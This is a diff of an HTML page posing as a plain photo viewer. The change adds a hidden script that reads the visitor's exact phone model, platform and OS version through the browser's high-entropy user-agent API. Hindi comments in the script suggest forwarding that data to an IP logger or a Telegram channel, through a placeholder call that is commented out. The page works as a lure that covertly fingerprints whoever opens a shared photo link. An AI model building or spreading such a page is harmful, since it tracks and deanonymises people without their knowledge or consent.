@@ -5,30 +5,36 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <!-- Cloudflare Web Analytics -->
-    <script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "f344dd54cd5b4013aad2abf0877167e9"}'></script>
+    <script type='module' src='https://cloudflareinsights.com' data-cf-beacon='{"token": "f344dd54cd5b4013aad2abf0877167e9"}'></script>
     <!-- End Cloudflare Web Analytics -->
 
     <style>
-        body {
-            background-color: black; 
-            margin: 0; 
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        img {
-            max-width: 100%;
-            max-height: 100vh;
-            object-fit: contain;
-        }
+        body { background-color: black; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
     </style>
 </head>
 <body>
 
-    <!-- फोटो अब सीधे इसी पेज पर लोड होगी, जिससे क्लाउडफ्लेयर ट्रैक कर पाएगा -->
     <img src="photo.jpg" alt="Image Viewer">
+
+    <script>
+        // एडवांस तरीका फोन का सटीक मॉडल निकालने का
+        if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
+            navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion'])
+            .then(ua => {
+                var phoneModel = ua.model ? ua.model : "Unknown Device";
+                console.log("सटीक फोन मॉडल:", phoneModel);
+                
+                // यहाँ से आप इस phoneModel डेटा को अपने IP Logger या Telegram पर भेज सकते हैं
+                // उदाहरण: sendDataToMyLogger(phoneModel);
+            })
+            .catch(err => {
+                console.log("मॉडल निकालने में एरर आया:", err);
+            });
+        } else {
+            console.log("यह ब्राउज़र सटीक मॉडल छुपा रहा है।");
+        }
+    </script>
 
 </body>
 </html>
